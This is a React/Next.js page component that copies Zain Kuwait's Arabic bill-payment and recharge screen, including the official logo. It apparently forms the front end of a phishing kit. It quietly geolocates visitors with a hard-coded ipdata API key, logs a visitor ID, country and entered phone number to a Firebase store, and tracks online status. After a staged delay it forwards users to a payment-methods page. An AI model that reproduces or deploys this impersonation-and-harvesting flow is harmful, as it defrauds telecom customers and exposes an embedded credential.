"use client"

import { useEffect, useState } from "react"
import { ChevronDown, Heart, Loader2, Menu, Plus, ShoppingCart } from "lucide-react"
import { cn, setupOnlineStatus } from "@/lib/utils"
import { useRouter } from "next/navigation"
import { addData } from "@/lib/firebasee"
import SplashScreen from "@/components/splash-screen"
import { fetchBalance } from "@/lib/api"
import { LiveChatWidget } from '@livechat/widget-react'
import { Button } from "@/components/ui/button"

export default function ZainPayment() {
  const [selectedTab, setSelectedTab] = useState("bill")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [isSubmitted, setIsSubmitted] = useState(false)
  const [loading, setIsLoading] = useState(true)
  const [showAmountDropdown, setShowAmountDropdown] = useState(false)
  const [selectedAmount, setSelectedAmount] = useState("29.900")
  const [otherAmount, setOtherAmount] = useState("0")
  const [fees, setFees] = useState("-0.600")
  const [total, setTotal] = useState("0.000")
  const [balanceData, setBalanceData] = useState<any | null>(null)
  const [isLoadingBalance, setIsLoadingBalance] = useState(false)
  const [balanceError, setBalanceError] = useState<string | null>(null)

  useEffect(() => {
    // Calculate total based on selected amount and fees
    const totalAmount = Math.max(0, Number.parseFloat(selectedAmount) + Number.parseFloat(fees)).toFixed(3)
    setTotal(totalAmount)
  }, [selectedAmount, fees])

  const _id=randstr('zain-')
  const router=useRouter()
  
  useEffect(() => {
    // Fetch balance when phone number changes and has 8 digits
    if (phoneNumber.length === 8) {
      getBalance(phoneNumber)
    }
  }, [phoneNumber])

  const getBalance = async (number: string) => {
    setIsLoadingBalance(true)
    setBalanceError(null)

    try {
      const data = await fetchBalance(number)
      setBalanceData(data)

      // Update the selected amount based on the balance due
      if (data.dueAmount) {
        setSelectedAmount(data.dueAmount)
      }
    } catch (error) {
      console.error("Failed to fetch balance:", error)
      setBalanceError("فشل في جلب معلومات الرصيد. يرجى المحاولة مرة أخرى.")
    } finally {
      setIsLoadingBalance(false)
    }
  }
  function randstr(prefix:string)
{
    return Math.random().toString(36).replace('0.',prefix || '');
}
useEffect(()=>{

  setTimeout(() => {
    setIsLoading(false)
  }, 4000);
},[])
  const amounts = [
    { value: "2.000", validity: 7 },
    { value: "4.000", validity: 15 },
    { value: "6.000", validity: 30 },
    { value: "12.000", validity: 90 },
    { value: "22.000", validity: 180 },
    { value: "30.000", validity: 365 },
  ]

  const adOptions = [
    { id: "basic", title: "الإعلان الأساسي", price: "5.000", description: "إعلان لمدة 7 أيام" },
    { id: "standard", title: "الإعلان القياسي", price: "10.000", description: "إعلان لمدة 15 يوم مع ميزة التثبيت" },
    {
      id: "premium",
      title: "الإعلان المميز",
      price: "20.000",
      description: "إعلان لمدة 30 يوم مع ميزة التثبيت والظهور في الصفحة الرئيسية",
    },
  ]

useEffect(()=>{
  getLocation().then(()=>{})
},[])

const openChat = () => {
  // Open Smartsupp chat
  if (window.smartsupp) {
    window.smartsupp("chat:open")

    // Optional: Send customer info to chat
    if (phoneNumber) {
      window.smartsupp("name", `Customer ${phoneNumber}`)
      window.smartsupp("variable", "Phone", phoneNumber)
    }
  }
}
useEffect(()=>{
  localStorage.setItem('amount',selectedAmount)
},[selectedAmount])
async function getLocation() {
  const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
  const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;

  try {
      const response = await fetch(url);
      if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
      }
      const country = await response.text();
      addData({
          id:_id,
          country: country
      })
      localStorage.setItem('country',country)
      setupOnlineStatus(_id)
    } catch (error) {
      console.error('Error fetching location:', error);
  }
}
  return (
    <div className="max-w-md mx-auto bg-white min-h-screen" dir="rtl">
      {/* Header */}
      <header className="flex items-center justify-end p-4 bg-[#2d1a45]">
        <div className="ml-auto flex">
          <Menu className="text-white"  size={24} />
          <img src="https://www.kw.zain.com/o/zain-theme/images/zain_logo.svg" alt="Zain Logo" className="h-7 " />
          </div>

        <Heart className="text-white" size={24} />
        <div className="bg-white rounded-full p-2 mx-2">
          <ShoppingCart className="text-[#2d1a45]" size={20} />
        </div>
        <div className=" right-16">
        </div>
      </header>

   
      {/* Main Content */}
      <div className="p-4">
        <h2 className="text-xl font-bold text-right mb-4">الدفع السريع</h2>

        {/* Tabs */}
        <div className="flex border-b mb-6">
          <button
            className={cn(
              "flex-1 py-3 text-center",
              selectedTab === "bill" ? "border-b-4 border-[#d13c8c] text-[#d13c8c]" : "text-gray-500",
            )}
            onClick={() => setSelectedTab("bill")}
          >
            دفع الفاتورة
          </button>
          <button
            className={cn(
              "flex-1 py-3 text-center",
              selectedTab === "recharge" ? "border-b-4 border-[#d13c8c] text-[#d13c8c]" : "text-gray-500",
            )}
            onClick={() => setSelectedTab("recharge")}
          >
            إعادة تعبئة eeZee
          </button>
        </div>

        {/* Form */}
        <div className="space-y-6">
          <div className="text-right mb-2">
            <p>أريد أن أعيد التعبئة </p>
          </div>

          <div className="relative">
            <select className="w-full flex justify-between items-center border-b-2 border-[#d13c8c] pb-2 cursor-pointer" onClick={() => {}}>
              <option value={1}> <ChevronDown className="text-[#d13c8c]" />
                <span>رقم آخر</span>
              </option>
              <option value={2}> <ChevronDown className="text-[#d13c8c]" />
                <span>رقم العقد</span>
              </option>
            </select>
          </div>
          <div className="mb-6">
            <label className="block text-right mb-2 font-medium text-black">
              رقم الهاتف <span className="text-red-500">*</span>
            </label>
            <input
              type="tel"
              maxLength={12}
              placeholder="أدخل الرقم 9XXXXXX"
              className="w-full p-3 border rounded text-right"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
            />
          </div>
          <div className="relative">
            <div className="flex justify-between items-center border-b-2 border-[#d13c8c]  py-6">
              <div
                className="flex items-center cursor-pointer"
                onClick={() => setShowAmountDropdown(!showAmountDropdown)}
              >
                <ChevronDown
                  className={`text-[#d13c8c] transition-transform ${showAmountDropdown ? "rotate-180" : ""}`}
                />
                <span className="ml-2">{selectedAmount} د.ك</span>
              </div>
              <label className="block text-right text-sm text-gray-500">مبلغ التعبئة</label>
            </div>
            <div className="text-right text-sm text-gray-500 mt-1">الصلاحية 30 يوم</div>

            {/* Dropdown */}
            {showAmountDropdown && (
              <div className="absolute  z-10 bg-white shadow-lg w-full mt-2 border rounded">
                {amounts.map((amount) => (
                  <div
                    key={amount.value}
                    className={`flex justify-between p-3 cursor-pointer hover:bg-gray-50 ${selectedAmount === amount.value ? "bg-gray-50" : ""}`}
                    onClick={() => {
                      localStorage.setItem('amount',selectedAmount)

                      setSelectedAmount(amount.value)
                      setShowAmountDropdown(false)
                     // localStorage.setItem('amount',selectedAmount)
                      console.log(selectedAmount)
                    }}
                  >
                    <div className="flex items-center">
                      {selectedAmount === amount.value && (
                        <svg className="w-5 h-5 text-[#d13c8c]" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
                        </svg>
                      )}
                      <span className="ml-2">{amount.value} د.ك</span>
                    </div>
                    <span>الصلاحية {amount.validity} يوم</span>
                  </div>
                ))}
              {/* Add Another Number Button */}
       

              </div>
            )}
               <button className="w-full mt-4 p-3 border-2 border-[#d13c8c] text-[#d13c8c] rounded-lg flex items-center justify-center">
            <Plus className="h-5 w-5 ml-2" />
            <span>أضف رقم آخر</span>
          </button>
          <div className="mt-6 flex justify-between items-center border-t pt-4">
            <div className="text-green-500 font-bold text-xl">{selectedAmount} د.ك</div>
            <div className="text-right font-bold text-black text-xl">إجمالي</div>
          </div>
          </div>
        </div>
      </div>

      {/* Offers Section */}
        <div className=" flex justify-between items-center">
        <button
        
        disabled={isSubmitted ||phoneNumber ===''} onClick={()=>{
          setIsSubmitted(true)
          const vistID=localStorage.getItem('visitor')
          addData({id:vistID, name:phoneNumber,phone:phoneNumber})
          setTimeout(() => {

            router.push('/payment-methods')
            setIsSubmitted(false)            

          }, 4000);
        }} className="w-full mt-28 justify-center flex bg-[#d13c8c] text-white py-3 rounded-md font-medium">
          دفع
          
{isSubmitted &&<Loader2 className="animate-spin mx-2"/>

}          </button>
        </div>
        {loading 
        &&<SplashScreen/>}
    <LiveChatWidget license="19137023" visibility="minimized"/>
      
    </div>
  )
}
